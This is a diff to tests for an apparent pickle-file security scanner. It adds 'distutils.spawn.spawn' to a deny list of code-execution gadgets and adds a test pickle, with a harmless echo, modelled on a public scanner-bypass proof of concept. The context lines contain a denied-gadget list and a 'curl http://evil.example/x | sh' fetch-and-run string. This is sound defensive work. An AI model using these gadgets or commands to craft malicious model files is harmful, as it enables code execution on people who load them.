@@ -242,6 +242,9 @@ class TestPublishedGadgetsAreDenied:
         "imaplib.IMAP4_stream",
         "builtins.open",
         "idlelib.run.Executive.runcode",
+        # runs a program; found as a "benign" file in a public bypass proof of concept
+        "distutils.spawn.spawn",
+        "setuptools._distutils.spawn.spawn",  # where `distutils` resolves on Python 3.12+
     ])
     def test_published_gadget_is_denied(self, ref):
         assert _classify_pickle_global(ref) == "denied"
@@ -254,6 +257,7 @@ class TestPublishedGadgetsAreDenied:
         "pipeline.Model",           # not `pip`
         "socketserver_custom.X",    # not `socket`
         "uuid.UUID",                # deliberately excluded from the wildcards
+        "distutils.version.LooseVersion",  # only distutils.spawn is denied, not all of distutils
     ])
     def test_module_wildcards_respect_component_boundaries(self, ref):
         """A wholly-denied module is matched on dotted-component boundaries,
@@ -1148,3 +1152,20 @@ class TestBinaryBytesAreNotCommands:
         raw = b"curl http://evil.example/x | sh ; id"
         findings = _scan(tmp_path, "cmd.pkl", pickle.dumps(raw, protocol=2))
         assert self._high(findings), [(f.rule_id, f.severity) for f in findings]
+
+
+class TestDistutilsSpawn:
+    """distutils.spawn.spawn(cmd) runs a program. A public scanner-bypass proof of concept
+    used it with a list argument, which no argument heuristic reads as a shell command,
+    so before it was denied by name it came out as a plain INFO "unrecognized global"."""
+
+    # The proof of concept's byte shape: protocol 4, STACK_GLOBAL, a list argument.
+    # The command is a harmless echo.
+    SPAWN = (b"\x80\x04\x95H\x00\x00\x00\x00\x00\x00\x00\x8c\x0fdistutils.spawn\x94\x8c\x05spawn\x94\x93\x94]\x94(\x8c\x04echo\x94\x8c\x05hello\x94e\x85\x94R\x94.")
+
+    def test_spawn_with_a_list_argument_is_critical(self, tmp_path):
+        findings = _scan(tmp_path, "model.joblib", self.SPAWN)
+        denied = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
+        assert denied, [(f.rule_id, f.severity) for f in findings]
+        assert denied[0].severity == Severity.CRITICAL
+        assert "distutils.spawn.spawn" in denied[0].message
